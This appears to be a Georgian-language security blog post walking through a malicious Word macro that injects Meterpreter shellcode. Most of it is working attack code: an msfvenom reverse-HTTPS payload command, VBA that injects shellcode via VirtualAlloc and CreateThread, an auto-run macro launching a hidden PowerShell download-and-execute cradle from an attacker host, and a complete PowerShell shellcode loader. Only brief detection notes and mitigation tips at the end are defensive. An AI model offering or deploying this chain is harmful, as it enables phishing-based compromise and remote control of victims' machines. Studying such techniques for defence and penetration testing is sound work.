+++
title = 'Inject Shellcode'
date = 2024-04-06T10:00:58-04:00
draft = false
+++
![Untitled](/images/inject-shellcode/main-logo.jpg)

მოგესალმებით

კიბერ-კრიმინალები ხშირად მიმართავენ მაკროებს MS Word ან MS Excell - ის დოკუმენტებში, თუმცა ნელ-ნელა ეს ტენდენცია იკლებს რადგანაც Microsoft - მა აკრძალა მაკროების გაშვება ისეთ ფაილებზე, რომლებიც ინტერნეტიდან არის გადმოწერილი.

დღევანდელ პოსტში ვისაუბრებთ მარტივ მაკროზე, რომლის მიზანიცაა MS Word - ის პროცესში Meterpreter Shellcode - ს ინექცია შემდეგი კლასიკური მეთოდით:

1. VirtualAlloc
2. RtlMoveMemory
3. CreateThread

შენიშვნა: ეს პოსტიც და ყველა სხვა პოსტიც, ამ ბლოგზე არის მხოლოდ საგანმანათლებლო. ნებისმიერი არასანქცირებული ქმედება ისჯება კანონდებლობით.

პირველ რიგში დავაგენერიროთ Meterpreter შელკოდი, რომელიც იქნება განკუთვნილი 64 ბიტიანი პროცესისთვის და გაეშვება როგორც ნაკადი (thread).

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.131.129 LPORT=443 EXITFUNC=thread -f vbapplication

![Untitled](/images/inject-shellcode/Untitled.png)

ვქმნით ახალ ვორდის ფაილს და ვწერთ მაკროს და ვანხორციელებთ შემდეგ ოპერაციებს:

![Untitled](/images/inject-shellcode/Untitled%201.png)

ვაიმპორტებთ 3 Win API ფუნქციებს. ეს არის კლასიკური ფუნქციები მექსიერებაში კოდის ინექციისთვის. არაფერი ახალი ამაში არ არის.
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, _
                                                              ByVal StackSize As Long, _
                                                              ByVal StartFunction As LongPtr, _
                                                              ThreadParameter As LongPtr, _
                                                              ByVal CreateFlags As Long, _
                                                              ByRef ThreadId As Long) As LongPtr
                                                              

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, _
                                                              ByVal dwSize As Long, _
                                                              ByVal flAllocationType As Long, _
                                                              ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, _
                                                               ByRef sSource As Any, _
                                                               ByVal lLength As Long) As LongPtr
```
    buf ცვლადი შეიცავს შელკოდს

buf = Array(252, 72, ... , 213)

    თითო ბაიტს ვწერთ ახალ მისამართზე

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ვქმნით ახალ thread - ს

res = CreateThread(0, 0, addr, 0, 0, 0)

და ყველა პენტესტერისთვის საყვარელი მომენტი:

![Untitled](/images/inject-shellcode/Untitled%203.png)

თუმცა პრობლემა იმაშია, რომ ჩვენი შელკოდი პირდაპირ ვორდის ფაილშია “ჩაკერებული”, ის ქმნის იმის რისკს რომ ანტივირუსები მარტივად დააფიქსირებენ. უკეთესი გზა იქნება გამოვიყენოთ powershell ამისათვის და ჩვენი მაკრო დავა უფრო მარტივ კოდამდე:
```
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    Dim cmd As String
    cmd = "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.131.129/lab/run.ps1')"
    CreateObject("Wscript.Shell").Run cmd, 0
End Sub
```

![Untitled](/images/inject-shellcode/Untitled%204.png)

აქ ისედაც ყველაფერი გასაგებია. გადავიდეთ მთავარ საკითხზე: ფაილი run.ps1

პირველ რიგში დავაგენერიროთ ახალი შელკოდი ოღონდ powershell ის ფორმატში:

![Untitled](/images/inject-shellcode/Untitled%205.png)

run.ps1 მოიცავს შემდეგ კოდს, რომელსაც გავყვებით დეტალურად:

```
# შელკოდი შემოკლებულია თორე ძაან დიდია :)))
[Byte[]] $buf = 0xfc,0x48,0x83 ... 0xda,0xff,0xd5
```
```
# ბაიტ array - ს სიგრძე ანუ შელკოდის სიგრძე
$size = $buf.length
```
```
# ვქმნით მცირე C# ის კოდს, რომელიც აიმპორტებს საჭირო ფუნქციებს
$NewType = @"
using System;
using System.Runtime.InteropServices;

public class ChemiKai {

  [DllImport("kernel32")]
  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  [DllImport("kernel32", CharSet = CharSet.Ansi)]
  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
```
```
# კომპილირდება ჩვენი C# კოდი და მემორიში იტვირთება როგორც ახალი .NET Assembly
Add-Type $NewType

# ცვლადში ვწერთ ახლად გამოყოფილ მეხსიერებას
[IntPtr]$Addr = [ChemiKai]::VirtualAlloc(0, $size, 0x3000, 0x40)

# ვაკოპირებთ ჩვენს შელკოდს $Addr მისამართზე
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $Addr, $size)

# ვქმნით ახალ ნაკადს ანუ thread - ს და ვუთითებთ ახლად გამოყოფილ მეხსიერებას
# სადაც იმყოფება ჩვენი შელკოდი: 0xfc, 0x48 და ა.შ
$tHandle = [ChemiKai]::CreateThread(0, 0, $Addr, 0, 0, 0)

# ამას ქვემოთ განვმარტავ
[ChemiKai]::WaitForSingleObject($tHandle, [uint32]"0xFFFFFFFF")
```
კომენტარები კოდში ისედაც ნათელს ხდის და ბევრს აღარ დავწერ. აღსანიშნავია მხოლოდ ბოლო ლაინი კოდის:
```
WaitForSingleObject($tHandle, [uint32]"0xFFFFFFFF")
```
სანამ powershell ის პროცესი დაასრულებს ჩვენი ჩვენი ფაილის: run.ps1 გაშვებას, ბოლოსკენ როგორც ნახეთ იქმნება ახალი ნაკადი, რომელიც რაღაც სხვა საქმეს აკეთებს(ამ შემთხვევაში გვიკავშირდება ჩვენ) თუ არ გამოვიყენებდით WaitForSingleObject ფუნქცის, მაშინ powershell - ი, მყისიერად დაასრულებდა ჩვენი ფაილის გაშვებას და პროცესიც მოკვდებოდა და რათქმაუნდა ჩვენი ახალი ნაკადიც.

ამიტომ გვჭირდება ეს ფუნქცია, რომ დაელოდოს ჩვენი ნაკადის დასრულებას და მხოლოდ ამის მერე გაითიშება powershell ის პროცესიც.

და ბოლოს

![Untitled](/images/inject-shellcode/Untitled%205.png)

კლიენტის მხარეს ამის დაფიქსირება შესაძლებელია მაგალითად Process Explorer - ის მეშვეობით

![Untitled](/images/inject-shellcode/explorer.png)

როგორც სურათიდან ვხედავთ WINWORD.exe პროცესის შვილობილი პროცესია powershell.exe და TCP/IP გრაფაში ჩანს, რომ ქონექშენი აწეულია command and control თან.

რეკომენდაცია

- განაახლეთ მუდმივად თქვენი სისტემები
- ყოველდღიური საქმიანობისთვის ნუ იყენებთ ადმინისტრატორის უფლებების მქონე იუზერს.
- თუ თქვენთან მაკროები ჯერ კიდევ ეშვება, გათიშეთ საერთოდ. GPO - თი მარტივად გააკეთებთ თუ AD დომეინში ოპერირებთ


